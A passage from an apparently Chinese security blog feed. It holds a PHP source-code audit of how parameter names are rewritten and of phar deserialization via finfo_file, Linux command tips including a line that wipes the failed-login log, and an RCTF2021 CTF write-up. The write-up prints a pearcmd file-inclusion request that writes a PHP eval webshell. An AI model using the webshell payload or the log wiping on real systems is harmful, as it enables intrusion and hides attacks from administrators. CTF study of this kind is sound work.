ZVAL_NEW_STR 是注册字符串操作</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111055574.png" alt="image-20220111105528468"></p><p>终于来到了真正产生问题的地方，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">PHPAPI <span class="hljs-keyword">void</span> <span class="hljs-title">php_register_variable_ex</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *var_name, zval *val, zval *track_vars_array)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *p = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *ip = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">/* index pointer */</span><br><span class="hljs-keyword">char</span> *index;<br><span class="hljs-keyword">char</span> *var, *var_orig;<br><span class="hljs-keyword">size_t</span> var_len, index_len;<br>zval gpc_element, *gpc_element_p;<br>zend_bool is_array = <span class="hljs-number">0</span>;<br>HashTable *symtable1 = <span class="hljs-literal">NULL</span>;<br>ALLOCA_FLAG(use_heap)<br><br>assert(var_name != <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">if</span> (track_vars_array &amp;&amp; Z_TYPE_P(track_vars_array) == IS_ARRAY) &#123;<br>symtable1 = Z_ARRVAL_P(track_vars_array);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!symtable1) &#123;<br><span class="hljs-comment">/* Nothing to do */</span><br>zval_ptr_dtor_nogc(val);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-comment">/* ignore leading spaces in the variable name */</span><br><span class="hljs-keyword">while</span> (*var_name==<span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>var_name++;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Prepare variable name</span><br><span class="hljs-comment"> */</span><br>var_len = <span class="hljs-built_in">strlen</span>(var_name);<br>var = var_orig = do_alloca(var_len + <span class="hljs-number">1</span>, use_heap); <span class="hljs-comment">//传值</span><br><span class="hljs-built_in">memcpy</span>(var_orig, var_name, var_len + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">/* ensure that we don&#x27;t have spaces or dots in the variable name (not binary safe) */</span><br><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>var_len = p - var;<br><br><span class="hljs-keyword">if</span> (var_len==<span class="hljs-number">0</span>) &#123; <span class="hljs-comment">/* empty variable name, or variable name with a space in it */</span><br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp; EG(current_execute_data)) &#123;<br>zend_execute_data *ex = EG(current_execute_data);<br><br><span class="hljs-keyword">while</span> (ex) &#123;<br><span class="hljs-keyword">if</span> (ex-&gt;func &amp;&amp; ZEND_USER_CODE(ex-&gt;func-&gt;common.type)) &#123;<br><span class="hljs-keyword">if</span> ((ZEND_CALL_INFO(ex) &amp; ZEND_CALL_HAS_SYMBOL_TABLE)<br>&amp;&amp; ex-&gt;symbol_table == symtable1) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;this&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span>) == <span class="hljs-number">0</span>) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ex = ex-&gt;prev_execute_data;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* GLOBALS hijack attempt, reject parameter */</span><br><span class="hljs-keyword">if</span> (symtable1 == &amp;EG(symbol_table) &amp;&amp;<br>var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp;<br>!<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;GLOBALS&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span>)) &#123;<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>index = var;<br>index_len = var_len;<br><br><span class="hljs-keyword">if</span> (is_array) &#123;<br><span class="hljs-keyword">int</span> nest_level = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">char</span> *index_s;<br><span class="hljs-keyword">size_t</span> new_idx_len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span>(++nest_level &gt; PG(max_input_nesting_level)) &#123;<br>HashTable *ht;<br><span class="hljs-comment">/* too many levels of nesting */</span><br><br><span class="hljs-keyword">if</span> (track_vars_array) &#123;<br>ht = Z_ARRVAL_P(track_vars_array);<br>zend_symtable_str_del(ht, var, var_len);<br>&#125;<br><br>zval_ptr_dtor_nogc(val);<br><br><span class="hljs-comment">/* do not output the error message to the screen,</span><br><span class="hljs-comment"> this helps us to to avoid &quot;information disclosure&quot; */</span><br><span class="hljs-keyword">if</span> (!PG(display_errors)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variable nesting level exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_nesting_level in php.ini.&quot;</span>, PG(max_input_nesting_level));<br>&#125;<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;       <span class="hljs-comment">//这里就是&#x27;[&#x27;被替换成&#x27;_&#x27;的原因了 在处理数组的逻辑中如果找不到对应的 &#x27;[&#x27;就 替换为 &#x27;_&#x27;</span><br><br>index_len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (index) &#123;<br>index_len = <span class="hljs-built_in">strlen</span>(index);<br>&#125;<br><span class="hljs-keyword">goto</span> plain_var;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>*ip = <span class="hljs-number">0</span>;<br>new_idx_len = <span class="hljs-built_in">strlen</span>(index_s);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!index) &#123;<br>array_init(&amp;gpc_element);<br><span class="hljs-keyword">if</span> ((gpc_element_p = zend_hash_next_index_insert(symtable1, &amp;gpc_element)) == <span class="hljs-literal">NULL</span>) &#123;<br>zend_array_destroy(Z_ARR(gpc_element));<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>gpc_element_p = zend_symtable_str_find(symtable1, index, index_len);<br><span class="hljs-keyword">if</span> (!gpc_element_p) &#123;<br>zval tmp;<br>array_init(&amp;tmp);<br>gpc_element_p = zend_symtable_str_update_ind(symtable1, index, index_len, &amp;tmp);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(gpc_element_p) == IS_INDIRECT) &#123;<br>gpc_element_p = Z_INDIRECT_P(gpc_element_p);<br>&#125;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(gpc_element_p) != IS_ARRAY) &#123;<br>zval_ptr_dtor_nogc(gpc_element_p);<br>array_init(gpc_element_p);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>SEPARATE_ARRAY(gpc_element_p);<br>&#125;<br>&#125;<br>&#125;<br>symtable1 = Z_ARRVAL_P(gpc_element_p);<br><span class="hljs-comment">/* ip pointed to the &#x27;[&#x27; character, now obtain the key */</span><br>index = index_s;<br>index_len = new_idx_len;<br><br>ip++;<br><span class="hljs-keyword">if</span> (*ip == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>is_array = <span class="hljs-number">1</span>;<br>*ip = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">goto</span> plain_var;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br></code></pre></td></tr></table></figure><p>总结一下吧</p><p>对于 ‘ ‘ 和  ‘.’ 成因在于,算是隐性的PHP特性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于’[‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;   <span class="hljs-comment">//数组标志位</span><br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (is_array) &#123;<br>...<br>           ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;  <span class="hljs-comment">//这里就是&#x27;[&#x27;被替换成&#x27;_&#x27;的原因了 在处理数组的逻辑中如果找不到对应的 &#x27;[&#x27;就 替换为 &#x27;_&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="可反序列化函数成因"><a href="#可反序列化函数成因" class="headerlink" title="可反序列化函数成因"></a>可反序列化函数成因</h3><p>phar反序列化触发函数<code>finfo_file/finfo_buffer/mime_content_type</code></p><p>做题遇到的 稍微看看这里只看finfo_file这个函数</p><p>首先看看为什么phar可以用来做反序列化，在<code>/ext/phar/phar.c#line618</code>处phar在处理元数据(metadata)时调用了反序列化函数，如图</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149335.png" alt="image-20220111114936225">然后来看看 finfo_file 是如何触发反序列化的</p><p>追踪到 <code>/ext/fileinfo/fileinfo.c#line600</code> 发现了 finfo_file具体实现的函数_php_finfo_get_type</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149947.png" alt="image-20220111114944892"></p><p>跟进 _php_finfo_get_type #line432处，发现_php_finfo_get_type 的实现方法</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150269.png" alt="image-20220111115006179"></p><p>line553 发现这里有打开文件流的操作，且这行代码一定会执行一遍。这里使用的是php_stream系列的API，可以使用stream_get_wrapper看到系统内注册了哪一些wrapper</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150601.png" alt="image-20220111115022534"></p><p>发现了phar 因此我们理解了 finfo_file成为 phar反序列化影响函数的原因。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux日常小技巧</title>
    <link href="/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux日常使用小技巧"><a href="#Linux日常使用小技巧" class="headerlink" title="Linux日常使用小技巧"></a>Linux日常使用小技巧</h1><h2 id="定义你的环境变量"><a href="#定义你的环境变量" class="headerlink" title="定义你的环境变量"></a>定义你的环境变量</h2><p>基础用法：</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">export var_name=var_value<br></code></pre></td></tr></table></figure><p>永久生效你的环境变量</p><p>把生成环境变量的语句，放到一下任意一文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/etc/profile<br>/etc/profile.d/*.sh<br>/etc/bashrc<br></code></pre></td></tr></table></figure><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;export var_name=var_value&quot; &gt;&gt; /root/.bashrc\<br>source !$    #这个时候重新开一个shell echo $var_name 就可以发现我们的刚刚永久生效了<br></code></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><blockquote><p>nohup命令 可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端</p></blockquote><p>这个命令常常与 &amp; 相结合</p><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup ping www.baidu.com &amp;  #注意我们不要只会移动到后台执行，但是不知道怎么结束<br><span class="hljs-meta">#</span><span class="bash">下面给一个样例</span><br><span class="hljs-meta">#</span><span class="bash">利用 <span class="hljs-built_in">jobs</span> 命令查看后台进程，然后使用<span class="hljs-built_in">fg</span>命令将后台运行的或挂起的任务（或作业）切换到前台运行</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091033363.png" alt="image-20220109103321273"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><blockquote><p>用来探测给定文件的类型,file命令 用来探测给定文件的类型。</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">filefilename  #用于帮助我们确定文件类型<br>file /usr/bin/ls  #解读可执行程序<br></code></pre></td></tr></table></figure><h3 id="fgrep"><a href="#fgrep" class="headerlink" title="fgrep"></a>fgrep</h3><blockquote><p>搜索文件中的字符串，只支持搜索字符串</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">fgrep -i flag 1  #在1这个文件中搜索含有flag的字符串<br>返回结果：<br>root@VM-24-13-debian:~# fgrep -i flag 1<br>flag&#123;This_is_test&#125;<br>ASFLAG<br></code></pre></td></tr></table></figure><h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><blockquote><p>列出目前与过去登入系统的用户相关信息</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">last</span> -<span class="hljs-keyword">a</span>:    <span class="hljs-comment">#把从何处登入系统的主机名称或ip地址，显示在最后一行</span><br><span class="hljs-keyword">last</span> -n    <span class="hljs-comment">#(number不是字母5)</span><br><span class="hljs-keyword">last</span> -F    <span class="hljs-comment">#尽可能详细的说明时间信息</span><br><span class="hljs-keyword">last</span> root <span class="hljs-comment"># 显示root之前登录的信息</span><br></code></pre></td></tr></table></figure><h3 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h3><blockquote><p>列出登入系统失败的用户相关信息，你也许可以利用这个来获得攻击者的信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">lastb -a  #还是优先掌握这个吧，实质是读取/var/log/btmp <br>echo &gt; /var/log/btmp  清除lastb对应的文件内容<br></code></pre></td></tr></table></figure><h3 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h3><blockquote><p>用来改变文件属性</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">参数<br>-R 递归处理，将指定目录下的所有文件及子目录一并处理。<br>+&lt;属性&gt; 开启文件或目录的该项属性。<br>-&lt;属性&gt; 关闭文件或目录的该项属性。<br>=&lt;属性&gt; 指定文件或目录的该项属性。<br>i：不得任意更动文件或目录；<br>s：保密性删除文件或目录；<br>a：让文件或目录仅供附加用途<br><br>chattr +i /etc/my.cnf  #用chattr命令防止系统中某个关键文件被修改<br>lsattr /etc/my.cnf  #查看文件属性<br>chattr +a /var/log/message#某个文件只能往里面追加数据，但不能删除，适用于各种日志文件<br></code></pre></td></tr></table></figure><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>几个不错的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">set number     #显示行号<br>set autoindent # 自动缩进<br>/value    #搜索vlaue这个字符串 使用 n进行上下切换<br>/value -c   #大小写不敏感搜索<br><span class="hljs-meta">%</span><span class="bash">s/foo/bar/g  <span class="hljs-comment">#%全局替换 把 foo 替换为bar</span></span>  <br>s/foo/bar/g  #替换当前行的foo<br><span class="hljs-meta">%</span><span class="bash">s/$/123/    <span class="hljs-comment">#在每一行的结尾追加123</span></span><br><span class="hljs-meta">%</span><span class="bash">s/^<span class="hljs-comment">#//      #删每一行开头的#</span></span><br></code></pre></td></tr></table></figure><p>参考公众号：入门小站</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>RCTF2021部分复现</title>
    <link href="/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCTF2021复现"><a href="#RCTF2021复现" class="headerlink" title="RCTF2021复现"></a>RCTF2021复现</h1><p>来源：<a href="https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/">https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/</a></p><h2 id="VerySafe"><a href="#VerySafe" class="headerlink" title="VerySafe"></a>VerySafe</h2><p>虽然但是，复现有点恶心，环境啥也没有，不得不去看wp</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/ccreater222/my-ctf-challenges.git<br>cd /my-ctf-challenges/RCTF2021/VerySafe/docker/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><strong>前置知识</strong></h3><h4 id="pearcmd实现裸文件包含"><a href="#pearcmd实现裸文件包含" class="headerlink" title="pearcmd实现裸文件包含"></a>pearcmd实现裸文件包含</h4><p>利用条件：</p><ul><li>PHP 开启register_argc_argv</li><li>PHP以Server的形式运行</li></ul><p>pecl是PHP中用于管理扩展而使用的命令行工具，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>如图，在拖取下来的镜像中存在 pearcmd.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081736563.png" alt="image-20220108173616492"></p><p>如果这是PHP开启了 <code>register_argc_argv</code> 这个选项，那么我们传入的参数将会被当做命令行参数 argv</p><blockquote><p>RFC3875中规定，如果query-string中不包含没有编码的&#x3D;，且请求是GET或HEAD，则query-string需要被作为命令行参数。但PHP没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给$_SERVER[‘argv’]</p></blockquote><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081755960.png" alt="image-20220108175527866"></p><p>接着我们查看 <code>pearcmd.php</code> ，发现config-create参数可以帮助我们创建一个文件，且内容可控，那这个时候就可以写入一个shell</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>构建</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /../usr/local/lib/php/peclcmd.php?+config-create+/tmp/&lt;?=eval($_POST[<span class="hljs-number">1</span>]);?&gt;/*+/tmp/qqqq.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) 